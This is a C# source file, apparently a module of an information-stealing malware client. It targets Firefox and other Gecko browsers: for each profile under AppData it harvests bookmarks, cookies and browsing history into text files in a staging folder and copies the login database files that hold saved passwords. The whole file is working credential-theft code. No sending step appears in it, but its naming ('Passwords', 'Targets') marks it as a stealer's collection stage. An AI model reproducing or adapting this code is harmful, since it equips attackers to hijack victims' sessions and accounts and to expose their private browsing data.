using System;
using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Firefox;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		string[] sGeckoBrowserPaths = Paths.sGeckoBrowserPaths;
		foreach (string text in sGeckoBrowserPaths)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = sSavePath + "\\" + name;
				if (Directory.Exists(Paths.appdata + text + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Bookmark> bBookmarks = cBookmarks.Get(Paths.appdata + text);
					List<Cookie> list = cCookies.Get(Paths.appdata + text);
					List<Site> sHistory = cHistory.Get(Paths.appdata + text);
					cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					cBrowserUtils.WriteCookies(list, text2 + "\\Cookies.txt");
					cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
					cLogins.GetDBFiles(Paths.appdata + text + "\\Profiles\\", text2);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
